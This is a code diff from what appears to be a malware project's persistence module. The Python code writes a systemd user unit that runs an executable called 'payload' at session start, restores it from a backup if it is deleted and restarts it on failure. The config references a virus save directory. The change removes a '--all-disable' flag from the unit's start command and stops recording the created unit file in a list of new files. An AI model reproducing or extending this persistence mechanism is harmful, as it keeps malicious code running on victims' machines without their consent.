@@ -12,9 +12,10 @@ The unit is configured to start after the graphical session is available and wil
 import os
 import subprocess
 import textwrap
-import hashlib
+from pathlib import Path
 from typing import Optional
-from config import UNIT_NAME, UNIT_DIR, SAVE_VIRUS_DIR, BACKUP_DIR, LIST_NEW_FILES
+from config import UNIT_NAME, UNIT_DIR, SAVE_VIRUS_DIR, BACKUP_DIR
+from utils import check_sum_content
 
 
 def create_unit_content(progFileName: str = "payload", progFileBackup: str = "payload.bak") -> Optional[str]:
@@ -35,7 +36,7 @@ def create_unit_content(progFileName: str = "payload", progFileBackup: str = "pa
     WorkingDirectory=%h
 
     ExecStartPre=/bin/sh -c '[ -x "$PROG" ] || {{ [ -f "$BACKUP" ] && cp "$BACKUP" "$PROG" && chmod +x "$PROG"; :; }}'
-    ExecStart=/bin/sh -c '[ -x "$PROG" ] && exec "$PROG" --all-disable || {{ echo "No payload or backup available, skipping"; exit 0; }}'
+    ExecStart=/bin/sh -c '[ -x "$PROG" ] && exec "$PROG" || {{ echo "No payload or backup available, skipping"; exit 0; }}'
 
     Restart=on-failure
     RestartSec=3
@@ -46,33 +47,24 @@ def create_unit_content(progFileName: str = "payload", progFileBackup: str = "pa
 """)
     return unit_content
 
-def check_sum_unit_content(unit_content: str) -> str:
-    h = hashlib.md5()
-    h.update(unit_content.encode('utf-8'))
-    return h.hexdigest()
-
 def install_systemd_service(unit_content: str) -> bool:
     unit_dir = os.path.expanduser(UNIT_DIR)
 
-    unit_path = os.path.join(unit_dir, UNIT_NAME)
+    unit_path = Path(unit_dir) / UNIT_NAME
 
     # Check if the file exists and the content has not changed then do nothing
     if os.path.exists(unit_path):
-        with open(unit_path, 'r', encoding='utf-8') as f:
-            existing_content = f.read()
-        if check_sum_unit_content(existing_content) == check_sum_unit_content(unit_content):
+        existing_content = unit_path.read_text()
+        if check_sum_content(existing_content) == check_sum_content(unit_content):
             print("Unit file already exists and is up to date.")
             return True
     try:
         # Write unit file
         print(f"Creating unit file: {unit_path}")
-        with open(unit_path, 'w', encoding='utf-8') as f:
-            f.write(unit_content)
+        unit_path.write_text(unit_content)
 
         # Set file permissions
         os.chmod(unit_path, 0o644)
-
-        LIST_NEW_FILES.append(unit_path)
 
         # Reload systemd
         print("Realoading systemd...")
